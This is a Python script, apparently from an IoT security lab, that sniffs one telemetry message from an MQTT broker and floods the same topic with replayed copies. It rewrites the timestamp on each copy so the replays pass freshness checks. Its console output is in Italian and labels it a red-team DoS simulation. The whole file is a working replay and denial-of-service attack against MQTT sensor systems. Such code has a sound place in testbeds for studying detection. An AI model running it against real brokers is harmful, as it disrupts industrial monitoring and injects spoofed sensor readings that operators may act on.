import argparse
from datetime import datetime
import json
from pathlib import Path
import sys
import time

_REPO_ROOT = Path(__file__).resolve().parent.parent
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

from common.mqtt_config import ProjectConfig, create_mqtt_client


def main():
    cfg = ProjectConfig()
    parser = argparse.ArgumentParser(description="Scenario 1: Passive MQTT sniffing + volumetric replay DoS simulation.")
    parser.add_argument("--broker", default=cfg.broker_address)
    parser.add_argument("--port", type=int, default=cfg.broker_port)
    parser.add_argument("--topic", default=cfg.topic_telemetry)
    parser.add_argument("--interval", type=float, default=0.005, help="Delay between replayed packets in seconds")
    parser.add_argument("--max-packets", type=int, default=0, help="Optional max packets (0 = until Ctrl+C)")
    args = parser.parse_args()

    state = {"payload_rubato": None}

    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            print("🔴 Red Team: Connesso! Avvio fase di sniffing & replay...")
            client.subscribe(args.topic)
        else:
            print(f"Errore connessione: {rc}")

    def on_message(client, userdata, msg):
        if state["payload_rubato"] is None:
            try:
                captured = json.loads(msg.payload.decode("utf-8"))
                state["payload_rubato"] = captured
                print("🎯 [SNIFFER] Pacchetto intercettato con successo!")
                print(f"    -> RPM Attuali rilevati: {captured['sensori']['S1_Pompa_RPM']}")
            except (json.JSONDecodeError, KeyError, UnicodeDecodeError) as exc:
                print(f"[SNIFFER] Ignorato pacchetto non valido: {exc}")

    # Single MQTT client handle across sniffing and replay (properly stopped on exit)
    client = create_mqtt_client(client_id="RedTeam_DoS_Attacker")
    client.on_connect = on_connect
    client.on_message = on_message

    print(f"Connessione a {args.broker}...")
    client.connect(args.broker, args.port, 60)
    client.loop_start()

    try:
        print("🎧 In ascolto per rubare la telemetria di base...")
        while state["payload_rubato"] is None:
            time.sleep(0.1)

        # Unsubscribe immediately after capture to avoid flooding the attacker receive buffer
        client.unsubscribe(args.topic)
        payload_rubato = state["payload_rubato"]

        print("🔥 Avvio bombardamento volumetrico (Replay Attack)...")
        counter = 0
        while args.max_packets <= 0 or counter < args.max_packets:
            # Update timestamp so the replayed payload passes schema freshness formatting
            payload_rubato["timestamp"] = datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
            payload_str = json.dumps(payload_rubato)
            client.publish(args.topic, payload_str, qos=0)

            counter += 1
            if counter % 100 == 0:
                print(f"[+] Inviati {counter} pacchetti fotocopia...")
            if args.interval > 0:
                time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n🛑 Attacco DoS interrotto.")
    finally:
        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()

